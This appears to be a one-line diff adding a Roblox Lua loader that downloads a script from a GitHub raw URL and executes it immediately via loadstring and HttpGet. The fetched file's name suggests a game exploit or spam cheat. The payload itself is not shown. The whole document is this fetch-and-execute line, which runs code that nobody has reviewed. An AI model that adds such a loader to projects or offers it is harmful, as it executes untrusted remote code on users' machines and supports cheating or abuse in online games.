@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/illegal-soccer-spam2-5b2ea0leof9hr3.lua"))()
